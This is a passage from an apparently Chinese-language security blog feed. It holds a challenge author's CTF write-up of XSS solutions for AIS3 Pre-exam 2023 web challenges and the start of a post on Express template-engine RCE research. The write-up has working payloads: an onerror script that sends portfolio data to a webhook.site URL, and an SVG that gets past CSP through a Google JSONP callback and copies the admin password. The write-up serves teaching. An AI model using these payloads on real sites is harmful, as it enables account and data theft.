class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"</span></span></span><br><span class="line"><span class="string"><span class="tag">    fetch('/api/portfolio')</span></span></span><br><span class="line"><span class="string"><span class="tag">        .then(function (res) { return res.json() })</span></span></span><br><span class="line"><span class="string"><span class="tag">            .then(function (data) {</span></span></span><br><span class="line"><span class="string"><span class="tag">                location = `https://webhook.site/e4d998ee-e522-4327-a277-9fa10b77e43a?${JSON.stringify(data)}`</span></span></span><br><span class="line"><span class="string"><span class="tag">            });</span></span></span><br><span class="line"><span class="string"><span class="tag">"</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><img src="/ais3-pre-exam-2023-write-up/webhook.webp"></p><p>另外看到有一些人選擇偷 cookie，但 <code>connect.sid</code> 是設成了 http only，所以 Javascript 在一般情況下是拿不到這個跟登入狀態有關的 cookie 的。</p><p>另外在 MyFirstCTF 結束後我有上台分享大家都在 portfolio 裡面放了什麼，那份簡報在<a href="/ais3-pre-exam-2023-write-up/My%20First%20CTF%202023.pdf">這裡</a>。</p><p>另外這題 admin 的使用者名稱不叫作 admin，所以會看到有人會把 admin 註冊起來然後放假的 flag，很多人中計。</p><h4 id="E-portfolio"><a href="#E-portfolio" class="headerlink" title="E-portfolio"></a>E-portfolio</h4><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/e-portfolio">題目 source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>解題人數<ul><li>Pre-exam: 2 / 256 (score &gt;= 100)</li></ul></li></ul><p>其實原本沒有 E-Portfolio baby 這題，是 MyFirstCTF 題不夠才把 E-portfolio 簡化成新的一題。</p><p>這題跟 E-Portfolio baby 的差別只有多了 <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 跟 <a class="link" href="https://github.com/cure53/DOMPurify">DOMPurify <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的防護而已。</p><p>前一題的<a href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/share.eta#L29-L30">所有 <code>innerHTML</code> 的地方</a> 都被加上了 <code>DOMPurify.sanitize</code>，所以這些地方就很難 XSS 了，不過我們還有可以上傳圖片的地方，可以試試 SVG XSS。</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"&lt;%= it.nonce %&gt;"</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">`/api/share<span class="subst">${location.search}</span>`</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (data.<span class="property">success</span>) {</span></span><br><span class="line"><span class="language-javascript">                username.<span class="property">innerHTML</span> = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(data.<span class="property">data</span>.<span class="property">username</span>)</span></span><br><span class="line"><span class="language-javascript">                about.<span class="property">innerHTML</span> = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(data.<span class="property">data</span>.<span class="property">about</span>)</span></span><br><span class="line"><span class="language-javascript">                avatar.<span class="property">src</span> = data.<span class="property">data</span>.<span class="property">avatar</span></span></span><br><span class="line"><span class="language-javascript">            } <span class="keyword">else</span> {</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(data.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">            }</span></span><br><span class="line"><span class="language-javascript">        })</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>使用者上傳圖片之後會被 host 到 <code>/avatars/&lt;MD5 hash&gt;.&lt;ext&gt;</code>，所以確實可以 SVG XSS。</p><p>要 XSS 之前我們還需要 bypass <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。把<a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/app.js#L43-L63">網站設置的 CSP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 拿到 <a class="link" href="https://csp-evaluator.withgoogle.com/">CSP Evaluator <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 看看有哪些地方可以用來 XSS，發現 <code>'script-src'</code> 有 <code>https://*.google.com</code> 可以利用。</p><p><img src="/ais3-pre-exam-2023-write-up/csp-evaluator.png"></p><p>可以使用下面這個 endpoint，把 XSS payload 放到 <code>?callback</code> 裡就能用了，那個網址的回應如下二所示，可看到我們的 <code>fetch('/api/portfolio');</code> 被放進回應裡，而且是個可正常執行的 Javascript。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://accounts.google.com/o/oauth2/revoke?callback=fetch(%27/api/portfolio%27);</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// API callback</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">'/api/portfolio'</span>);({</span><br><span class="line">  <span class="string">"error"</span>: {</span><br><span class="line">    <span class="string">"code"</span>: <span class="number">400</span>,</span><br><span class="line">    <span class="string">"message"</span>: <span class="string">"Invalid JSONP callback name: 'fetch('/api/portfolio');'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed."</span>,</span><br><span class="line">    <span class="string">"status"</span>: <span class="string">"INVALID_ARGUMENT"</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div><p>所以解題步驟如下：</p><ol><li>把下面這個 SVG 設成自己的 avatar，他做的事情就是把使用者密碼存到自己的 portfolio 裡面。</li></ol><div class="highlight-container" data-rel="Svg"><figure class="iseeu highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">href</span>=<span class="string">"https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio')</span></span></span><br><span class="line"><span class="string"><span class="tag">                .then(function (res) { return res.json() })</span></span></span><br><span class="line"><span class="string"><span class="tag">                .then(function (data) {</span></span></span><br><span class="line"><span class="string"><span class="tag">                    if (data.success) {</span></span></span><br><span class="line"><span class="string"><span class="tag">                        const ADMIN_PASSWORD = data.data.password;</span></span></span><br><span class="line"><span class="string"><span class="tag">                        fetch('/api/login', {</span></span></span><br><span class="line"><span class="string"><span class="tag">                            method: 'POST',</span></span></span><br><span class="line"><span class="string"><span class="tag">                            headers: {</span></span></span><br><span class="line"><span class="string"><span class="tag">                                'Content-Type': 'application/json'</span></span></span><br><span class="line"><span class="string"><span class="tag">                            },</span></span></span><br><span class="line"><span class="string"><span class="tag">                            body: JSON.stringify({</span></span></span><br><span class="line"><span class="string"><span class="tag">                                username: 'c9dec36a35e1f8723cdcbbbad50123f3',</span></span></span><br><span class="line"><span class="string"><span class="tag">                                password: 'f7e2ca2336d33b6509656bb3581f0fa0' </span></span></span><br><span class="line"><span class="string"><span class="tag">                            })</span></span></span><br><span class="line"><span class="string"><span class="tag">                        })</span></span></span><br><span class="line"><span class="string"><span class="tag">                        .then(function (res) { </span></span></span><br><span class="line"><span class="string"><span class="tag">                            const formData = new FormData();</span></span></span><br><span class="line"><span class="string"><span class="tag">                            formData.append('about', ADMIN_PASSWORD);</span></span></span><br><span class="line"><span class="string"><span class="tag">                            fetch('/api/portfolio', {</span></span></span><br><span class="line"><span class="string"><span class="tag">                                method: 'PUT',</span></span></span><br><span class="line"><span class="string"><span class="tag">                                body: formData</span></span></span><br><span class="line"><span class="string"><span class="tag">                            })</span></span></span><br><span class="line"><span class="string"><span class="tag">                        })</span></span></span><br><span class="line"><span class="string"><span class="tag">                    } </span></span></span><br><span class="line"><span class="string"><span class="tag">                });"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></div><ol start="2"><li><p>把剛上傳好的 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 網址記下來，如果直接拜訪 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 可以確認 XSS 確實被觸發。</p><p>所以要把 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 送給 admin，需要蓋過<a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/portfolio.eta#L86C9-L103">原本 Share your portfolio with admin 的網址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，其實只需把 <code>onReport</code> 蓋成送我們的 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 的網址，像下面這樣。（之所以是蓋 <code>onReport</code> 的原因是因為 reCAPTCHA 的<a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/portfolio.eta#L35-L36">配置 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>關係）。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onReport</span>(<span class="params">token</span>) {</span><br><span class="line">    <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">`/avatars/8209116d30ade81ae5c2793d3d8ed4cf.svg`</span>, location)</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">'/api/report'</span>, {</span><br><span class="line">        <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="attr">headers</span>: {</span><br><span class="line">            <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span></span><br><span class="line">        },</span><br><span class="line">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>({ <span class="attr">url</span>: url.<span class="property">href</span>, <span class="string">'g-recaptcha-response'</span>: token }),</span><br><span class="line">    })</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> {</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">success</span>)</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">'Request sent!'</span>)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="title function_">alert</span>(data.<span class="property">message</span>)</span><br><span class="line">            grecaptcha.<span class="title function_">reset</span>();</span><br><span class="line">        })</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div></li><li><p>登入我們剛剛用來收資料的帳戶可以看到 portfolio 已經被設成 flag 了。</p></li></ol><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 35rem; " srcdoc="<html lang=&quot;en&quot;> <head> <title>Edit Portfolio</title> <script async=&quot;&quot; src=&quot;https://www.clarity.ms/tag/gsfl4ftdey&quot;></script> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <!-- Google tag (gtag.js) --> <script async=&quot;&quot; src=&quot;https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP&quot;></script> <script nonce=&quot;&quot;> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag(&quot;js&quot;, new Date()); gtag(&quot;config&quot;, &quot;G-2EDF3XCYWP&quot;); </script> <script type=&quot;text/javascript&quot; nonce=&quot;&quot;> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> </head> <body> <div class=&quot;container-sm mt-5&quot;> <h1 class=&quot;mb-3&quot;>Edit Portfolio</h1> <div class=&quot;row mb-5&quot;> <div class=&quot;col-sm-3&quot;> <h3 class=&quot;mb-3 mt-3&quot;>Photo</h3> <img src=&quot;/images/Ching367436.webp&quot; class=&quot;img-fluid&quot; id=&quot;avatar&quot; style=&quot;width: 15rem;&quot;> <div class=&quot;mt-3 mb-3&quot;> <label class=&quot;form-label&quot; for=&quot;avatarFile&quot;>Upload avatar</label> <input type=&quot;file&quot; class=&quot;form-control&quot; id=&quot;avatarFile&quot;> </div> </div> <div class=&quot;col-sm-9&quot;> <h3 class=&quot;mt-3&quot;>About <span id=&quot;username&quot;>c9dec36a35e1f8723cdcbbbad50123f3</span></h3> <textarea name=&quot;&quot; id=&quot;about&quot; class=&quot;form-control&quot; rows=&quot;10&quot;>AIS3{<script href=&quot;https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio');&quot;></script>}</textarea> </div> </div> <div class=&quot;container&quot;> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;save&quot;>Save</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;logout&quot;>Logout</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;share&quot;>Share</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;report&quot;>Share your portfolio with admin</button> </div> </div> </body> </html>"></iframe>]]></content>
    
    
    <summary type="html">今年來幫 AIS3 Pre-exam 來出題，共出了 1 題 crypto（2DES），3 題 web（Login Panel, E-Portfolio, E-Portfolio baby），裡面是我的 write-up。</summary>
    
    
    
    <category term="AIS3" scheme="https://blog.ching367436.me/categories/AIS3/"/>
    
    <category term="Pre-exam" scheme="https://blog.ching367436.me/categories/AIS3/Pre-exam/"/>
    
    
    <category term="ais3" scheme="https://blog.ching367436.me/tags/ais3/"/>
    
    <category term="ctf" scheme="https://blog.ching367436.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>AIS3 2022 最佳專題</title>
    <link href="https://blog.ching367436.me/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/"/>
    <id>https://blog.ching367436.me/ais3-2022-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/</id>
    <published>2023-04-08T07:40:39.000Z</published>
    <updated>2023-04-08T07:40:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>今年在 <a class="link" href="https://ais3.org/2022">AIS3 2022 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 研究了 <a class="link" href="https://expressjs.com/">Express JS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 與 <a class="link" href="https://expressjs.com/en/guide/using-template-engines.html">template engine <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 一起使用會有的資安問題。最後找到了 EJS ZeroDay RCE、Eta ZeroDay RCE&amp;XSS 以及一個已經有 CVE 的 Squirrelly ZeroDay RCE。我把我負責的 Eta ZeroDay RCE 回報給作者後，兩天內完成修補，取得 <a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-23630">CVE-2023-23630 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。隨後 <a class="link" href="https://www.cve.org/CVERecord?id=CVE-2022-25967">CVE-2022-25967 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的 <a class="link" href="https://github.com/advisories/GHSA-mf6x-hrgr-658f">security advisory <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 被發布，那其實是同個洞 / 類似的洞。我的漏洞報告在<a class="link" href="https://hackmd.io/@Ching367436/SkkvuMAoi">這裡 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>感謝當時的隊友 Entroy、Lillian 以及 hurosu 的幫忙。</p><!-- https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs#eta-template --><h2 id="專題"><a href="#專題" class="headerlink" title="專題"></a>專題</h2><h3 id="發現"><a href="#發現" class="headerlink" title="發現"></a>發現</h3><p>在 AIS3 課程期間，隊友 Entroy 發現了 <a class="link" href="https://entroychang.github.io/2023/03/06/NodeJS-template-CVEs#ejs-template">EJS ZeroDay RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的洞。 那是與 Cyku 大大在 AIS3 EOF 2020 Final 出的 <a class="link" href="https://twitter.com/cyku_tw/status/1362409802404610048">echo2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 相關的洞。Entroy 把他那題的 write-up 給我，我了解了那個洞的原理後，也開始來挖洞了！</p><!-- https://hackmd.io/@entroy/Skcv5DlK5 --><h3 id="原理及目標挑選"><a href="#原理及目標挑選" class="headerlink" title="原理及目標挑選"></a>原理及目標挑選</h3><p>那個洞只要能跟 Express JS 配在一起的 template engine 都可能會有的，問題的根源就在於 Express JS 的 <a class="link" href="https://expressjs.com/en/advanced/developing-template-engines.html">template engine API <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的設計。</p><h4 id="Express-JS-Template-engine-API"><a href="#Express-JS-Template-engine-API" class="headerlink" title="Express JS Template engine API"></a>Express JS Template engine API</h4><p>下方是 Express JS 的官方文件範例，第一個是 app.js：主程式，第二個是 views/index.ntl：template file。這個程式做的就是當使用者去訪問 <code>/</code> 的時候，會把 views/index.ntl render 起來傳回去。</p><p>我們要關注的是 <code>:3</code> <code>app.engine</code> 的第 2 個參數，那就是要接上 Express JS 的 template engine 本體。可以知道 template engine 可以取得的資訊有 <code>(filePath, options, callback)</code>。接著我們來看一下真實世界的 template engine 是怎麼實作的。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>) <span class="comment">// this engine requires the fs module</span></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">'ntl'</span>, <span class="function">(<span class="params">filePath, options, callback</span>) =&gt;</span> { <span class="comment">// define the template engine</span></span><br><span class="line">  fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">callback</span>(err)</span><br><span class="line">    <span class="comment">// this is an extremely simple template engine</span></span><br><span class="line">    <span class="keyword">const</span> rendered = content.<span class="title function_">toString</span>()</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">'#title#'</span>, <span class="string">`&lt;title&gt;<span class="subst">${options.title}</span>&lt;/title&gt;`</span>)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="string">'#message#'</span>, <span class="string">`&lt;h1&gt;<span class="subst">${options.message}</span>&lt;/h1&gt;`</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="literal">null</span>, rendered)</span><br><span class="line">  })</span><br><span class="line">})</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">'views'</span>, <span class="string">'./views'</span>) <span class="comment">// specify the views directory</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">'view engine'</span>, <span class="string">'ntl'</span>) <span class="comment">// register the template engine</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">'/'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">'index'</span>, { <span class="attr">title</span>: <span class="string">'Hey'</span>, <span class="attr">message</span>: <span class="string">'Hello there!'</span> })</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- views/index.ntl --&gt;</span></span><br><span class="line">#title#</span><br><span class="line">#message#</span><br></pre></td></tr></table></figure></div><h5 id="真實世界的-template-engine"><a href="#真實世界的-template-engine" class="headerlink" title="真實世界的 template engine"></a>真實世界的 template engine</h5><p>來看看 Eta 及 EJS 跟 Express 接合處的 code。</p><h6 id="Eta"><a href="#Eta" class="headerlink" title="Eta"></a>Eta</h6><p>看到 <code>renderFile</code> <code>:8</code> 的註解，Eta 的 <code>renderFile</code> 有 overload 成 <code>(filename, dataAndOptions, cb)</code> 及 <code>(filename, data, options, cb)</code> 。而前者是特別做給 Express 用的（<code>:10</code>），吃的是 <code>dataAndOptions</code>，<strong>所以 <code>data</code> 跟 <code>options</code> 是被混在一起的</strong>。那是 Express 預設的行為，Express 會把對他的設定一起跟 <code>data</code> 放到 <code>dataAndOptions</code> 裡面。 <code>data</code> 很多情況下會是使用者可控的，而  <code>options</code> 則否，把他混在一起不就讓這兩個東西都很容易被一起控制嗎？</p><p><a class="link" href="https://github.com/eta-dev/eta/blob/v1.14.2/src/file-handlers.ts#L186-L239">https://github.com/eta-dev/eta/blob/v1.14.2/src/file-handlers.ts#L186-L239 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">renderFile</span>(<span class="params"></span></span><br><span class="line"><span class="params">  filename: string,</span></span><br><span class="line"><span class="params">  data: DataObj,</span></span><br><span class="line"><span class="params">  config?: PartialConfig,</span></span><br><span class="line"><span class="params">  cb?: CallbackFn</span></span><br><span class="line"><span class="params"></span>): <span class="title class_">Promise</span>&lt;string&gt; | <span class="keyword">void</span> {</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  Here we have some function overloading.</span></span><br><span class="line"><span class="comment">  Essentially, the first 2 arguments to renderFile should always be the filename and data</span></span><br><span class="line"><span class="comment">  However, with Express, configuration options will be passed along with the data.</span></span><br><span class="line"><span class="comment">  Thus, Express will call renderFile with (filename, dataAndOptions, cb)</span></span><br><span class="line"><span class="comment">  And we want to also make (filename, data, options, cb) available</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure></div><h6 id="EJS"><a href="#EJS" class="headerlink" title="EJS"></a>EJS</h6><p>看到 <code>:22</code>，又是一個把 <code>data</code> 跟 <code>options</code> 混在一起的，而那都是為了 Express 。</p><p><a class="link" href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L441-L489">https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L441-L489 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">renderFile</span> = <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">var</span> args = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">  <span class="keyword">var</span> filename = args.<span class="title function_">shift</span>();</span><br><span class="line">  <span class="keyword">var</span> cb;</span><br><span class="line">  <span class="keyword">var</span> opts = {<span class="attr">filename</span>: filename};</span><br><span class="line">  <span class="keyword">var</span> data;</span><br><span class="line">  <span class="keyword">var</span> viewOpts;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do we have a callback?</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">arguments</span>[<span class="variable language_">arguments</span>.<span class="property">length</span> - <span class="number">1</span>] == <span class="string">'function'</span>) {</span><br><span class="line">    cb = args.<span class="title function_">pop</span>();</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">// Do we have data/opts?</span></span><br><span class="line">  <span class="keyword">if</span> (args.<span class="property">length</span>) {</span><br><span class="line">    <span class="comment">// Should always have data obj</span></span><br><span class="line">    data = args.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="comment">// Normal passed opts (data obj + opts obj)</span></span><br><span class="line">    <span class="keyword">if</span> (args.<span class="property">length</span>) {</span><br><span class="line">      <span class="comment">// Use shallowCopy so we don't pollute passed in opts obj with new vals</span></span><br><span class="line">      utils.<span class="title function_">shallowCopy</span>(opts, args.<span class="title function_">pop</span>());</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Special casing for Express (settings + opts-in-data)</span></span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">      <span class="comment">// Express 3 and 4</span></span><br><span class="line">      <span class="keyword">if</span> (data.<span class="property">settings</span>) {</span><br><span class="line">        <span class="comment">// Pull a few things from known locations</span></span><br><span class="line"><span class="comment">// 略...</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">tryHandleCache</span>(opts, data, cb);</span><br><span class="line">};</span><br></pre></td></tr></table></figure></div><p>所以我們知道，很多 template engine 為了配合 Express，都會有同一種不安全的行為：讓 <code>config</code> 可能有機會被使用者控制。而 <code>config</code> 若被控制，就很有可能達到 REC，因為通常都會認為 <code>config</code> 